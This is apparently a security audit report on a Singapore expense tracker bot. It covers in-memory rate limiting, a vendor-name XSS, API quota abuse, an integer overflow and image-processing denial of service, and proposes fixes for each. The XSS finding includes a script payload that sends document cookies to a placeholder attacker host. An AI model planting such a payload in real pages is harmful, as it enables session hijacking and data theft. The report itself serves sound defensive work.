# Penetration Test Report: Singapore Expense Tracker Bot

**Date:** 2026-02-19  
**Tester:** Security Researcher  
**Repository:** /root/.openclaw/workspace/sg-expense-tracker-bot/  
**Scope:** Full application security assessment

---

## Executive Summary

The Singapore Expense Tracker Bot was subjected to a comprehensive penetration test covering 5 major attack vectors. **6 vulnerabilities were identified**, ranging from High to Informational severity.

### Risk Rating

| Category | Score |
|----------|-------|
| **Overall Risk** | **MEDIUM-HIGH** |
| Exploitability | Medium |
| Impact | Medium |
| Remediation Effort | Low-Medium |

### Key Findings

| Severity | Count | Description |
|----------|-------|-------------|
| 🔴 **Critical** | 0 | None identified |
| 🟠 **High** | 1 | In-memory rate limiting bypass |
| 🟡 **Medium** | 2 | XSS, API abuse |
| 🟢 **Low** | 2 | Integer overflow, DoS potential |
| ⚪ **Info** | 1 | Database growth considerations |

---

## Detailed Findings

### 1. 🔴 HIGH: In-Memory Rate Limiting (CWE-307)

**Location:** `bot.py` lines 36-37, 47-48

**Description:**
Rate limiting is implemented using Python dictionaries stored in memory:

```python
user_last_request: Dict[int, float] = {}
user_daily_count: Dict[int, Dict[str, int]] = {}
```

**Vulnerability:**
- Rate limit data is lost when the bot restarts
- Attacker can bypass daily limits by triggering a restart
- No persistence mechanism for rate limit tracking

**Proof of Concept:**
```python
# Attacker exhausts 50/day limit
for i in range(50):
    send_receipt()  # Hits limit

# Trigger bot restart (or wait for admin)
# All rate limit data reset to empty dicts

# Immediately send 50 more receipts
for i in range(50):
    send_receipt()  # Works! Limit bypassed
```

**Impact:**
- Can bypass 50 receipt/day limit indefinitely
- Could exhaust Gemini API quota
- Potential for resource exhaustion attacks

**Recommendation:**
Store rate limits in persistent storage (SQLite or Redis):

```python
def check_daily_limit(user_id: int) -> bool:
    """Check limit using database storage."""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    today = datetime.now().strftime('%Y-%m-%d')
    
    cursor.execute('''
        SELECT COUNT(*) FROM transactions 
        WHERE user_id = ? AND date = ?
    ''', (user_id, today))
    
    count = cursor.fetchone()[0]
    conn.close()
    return count < MAX_DAILY_RECEIPTS
```

**Priority:** HIGH - Fix immediately

---

### 2. 🟡 MEDIUM: Cross-Site Scripting via Vendor Name (CWE-79)

**Location:** `bot.py` lines 315-320

**Description:**
Vendor names from receipts are sanitized minimally:

```python
vendor = ''.join(char for char in vendor if ord(char) >= 32)[:100]
```

**Vulnerability:**
- Only removes control characters (ASCII < 32)
- HTML tags and JavaScript are preserved
- If data is ever displayed in a web UI, XSS is possible

**Proof of Concept:**
```python
# Malicious receipt vendor name
malicious_vendor = "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"

# After sanitization:
sanitized = "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
# Script tags preserved!
```

**Impact:**
- Session hijacking if web dashboard exists
- Data theft
- Malicious actions on behalf of user

**Recommendation:**
Use HTML escaping for any user-displayed data:

```python
import html

# When displaying vendor names
safe_vendor = html.escape(vendor)

# Or use bleach for allowed HTML
import bleach
safe_vendor = bleach.clean(vendor, tags=[], strip=True)
```

**Priority:** MEDIUM - Fix before any web UI is built

---

### 3. 🟡 MEDIUM: AI Categorization API Abuse (CWE-770)

**Location:** `ai_categorization.py` lines 85-115

**Description:**
When AI categorization is enabled, each unknown vendor triggers an additional Gemini API call.

**Vulnerability:**
- 50 receipt uploads = 50 receipt processing calls
- If all vendors unknown + AI on = 50 additional categorization calls
- Total: 100 API calls per day per user

**Proof of Concept:**
```python
# With 100 users, all with AI enabled:
# 100 users × 100 calls = 10,000 API calls/day

# Gemini free tier: 1,500 requests/day
# Exhausted by just 15 active users!
```

**Impact:**
- API quota exhaustion
- Service disruption for all users
- Potential cost overruns

**Recommendation:**
Add separate rate limiting for AI categorization:

```python
MAX_AI_CALLS_PER_DAY = 10  # Separate limit for AI categorization

def categorize_with_ai(vendor_name: str, user_id: int, api_key: str) -> Optional[str]:
    if not check_ai_rate_limit(user_id):
        logger.warning(f"AI rate limit exceeded for user {user_id}")
        return 'others'
    # ... rest of function
```

**Priority:** MEDIUM - Fix to prevent API quota exhaustion

---

### 4. 🟢 LOW: Integer Overflow in Transaction ID (CWE-190)

**Location:** `bot.py` lines 270-275

**Description:**
Transaction IDs are converted to Python int without bounds checking.

**Vulnerability:**
- Python ints are arbitrary precision
- SQLite INTEGER is 64-bit
- Very large numbers cause conversion errors

**Proof of Concept:**
```python
# Input: 99999999999999999999
# Python accepts it as valid int
# SQLite: "Python int too large to convert to SQLite INTEGER"
```

**Impact:**
- Error noise in logs
- No security impact (just fails to delete)

**Recommendation:**
Add bounds checking:

```python
def delete_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        transaction_id = int(context.args[0])
        if not (1 <= transaction_id <= 2**63 - 1):
            raise ValueError("Transaction ID out of valid range")
    except ValueError:
        await update.message.reply_text("Invalid transaction ID")
        return
```

**Priority:** LOW - Fix for code quality

---

### 5. 🟢 LOW: Receipt Processing Denial of Service (CWE-400)

**Location:** `receipt_processor.py`, `bot.py` lines 292-296

**Description:**
Image processing lacks dimension and timeout controls.

**Vulnerabilities:**
1. No maximum image dimension checks
2. No processing timeout
3. PIL may hang on malformed images

**Attack Vectors:**
1. **Decompression Bomb:** Small file, huge memory when decompressed
2. **Malformed Image:** Corrupted data causing hangs
3. **Slowloris:** Slow upload connections exhausting pool

**Current Protection:**
- ✅ File size limit: 10MB
- ✅ Daily receipt limit: 50
- ❌ No image dimension limits
- ❌ No processing timeout

**Recommendation:**
Add image validation and timeouts:

```python
from PIL import Image
import signal

class TimeoutError(Exception):
    pass

def timeout_handler(signum, frame):
    raise TimeoutError("Processing timeout")

def validate_image(photo_bytes: bytearray) -> bool:
    """Validate image dimensions and format."""
    try:
        image = Image.open(io.BytesIO(photo_bytes))
        
        # Limit dimensions
        max_dimension = 10000  # pixels
        if image.width > max_dimension or image.height > max_dimension:
            return False
            
        # Limit total pixels (prevent decompression bombs)
        max_pixels = 100_000_000  # 100MP
        if image.width * image.height > max_pixels:
            return False
            
        return True
    except Exception:
        return False

def process_receipt_with_timeout(photo_bytes: bytearray, api_key: str, timeout_secs: int = 30):
    """Process receipt with timeout protection."""
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout_secs)
    
    try:
        result = process_receipt(photo_bytes, api_key)
        signal.alarm(0)  # Cancel alarm
        return result
    except TimeoutError:
        logger.error("Receipt processing timed out")
        return None
```

**Priority:** LOW - Mitigated by existing limits

---

### 6. ⚪ INFO: Database Growth Considerations

**Location:** `database.py`, `data/expenses.db`

**Description:**
SQLite database has no hard size limit, but growth is controlled.

**Current State:**
- Daily receipt limit: 50/user/day
- No automatic data retention policy
- No database size monitoring

**Recommendation:**
Consider implementing:
1. Data retention policy (e.g., delete records older than 2 years)
2. Database size monitoring/alerts
3. Archival strategy for old data

```python
def cleanup_old_transactions(retention_days: int = 730):  # 2 years
    """Remove transactions older than retention period."""
    cutoff_date = (datetime.now() - timedelta(days=retention_days)).strftime('%Y-%m-%d')
    
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM transactions WHERE date < ?', (cutoff_date,))
    deleted = cursor.rowcount
    conn.commit()
    conn.close()
    
    logger.info(f"Cleaned up {deleted} old transactions")
    return deleted
```

**Priority:** INFO - Monitor in production

---

## Security Measures Working Correctly

### ✅ SQL Injection Prevention
- Parameterized queries used throughout
- User input properly escaped by SQLite driver

### ✅ Path Traversal Prevention
- `sanitize_filename()` removes path components
- Path resolution check ensures files stay in `EXPORT_DIR`

### ✅ File Size Limits
- 10MB maximum photo size enforced
- Prevents memory exhaustion from large uploads

### ✅ API Key Security
- Keys loaded from environment variables
- No hardcoded credentials in source

### ✅ Error Handling
- Graceful degradation when APIs fail
- User-friendly error messages (no stack traces leaked)

---

## Remediation Roadmap

### Immediate (Within 1 Week)
1. **HIGH:** Implement persistent rate limiting (SQLite/Redis)
2. **MEDIUM:** Add AI categorization rate limits

### Short Term (Within 1 Month)
3. **MEDIUM:** Add HTML escaping for vendor names
4. **LOW:** Add transaction ID bounds checking

### Long Term (Ongoing)
5. **LOW:** Add image dimension validation and timeouts
6. **INFO:** Implement data retention policy

---

## Testing Methodology

The following attack vectors were tested:

| Vector | Tested | Result |
|--------|--------|--------|
| Rate Limiting Bypass | ✅ | 1 High vulnerability found |
| File Upload Attacks | ✅ | Properly mitigated |
| Input Injection | ✅ | 1 Medium vulnerability found |
| Resource Exhaustion | ✅ | 1 Low vulnerability found |
| API Abuse | ✅ | 1 Medium vulnerability found |

### Tools Used
- Custom Python penetration test scripts
- Static code analysis
- Manual code review

---

## Conclusion

The Singapore Expense Tracker Bot has a solid security foundation with proper SQL injection prevention, path traversal protection, and file size limits. However, the **in-memory rate limiting** is a significant vulnerability that should be addressed immediately.

The XSS vulnerability is currently theoretical (no web UI exists), but should be fixed as a defense-in-depth measure. The API abuse vulnerability could cause service disruption if the bot gains many users.

**Overall Recommendation:** Address the HIGH and MEDIUM severity issues before deploying to production with multiple users.

---

*Report generated: 2026-02-19*  
*Classification: Internal Use*
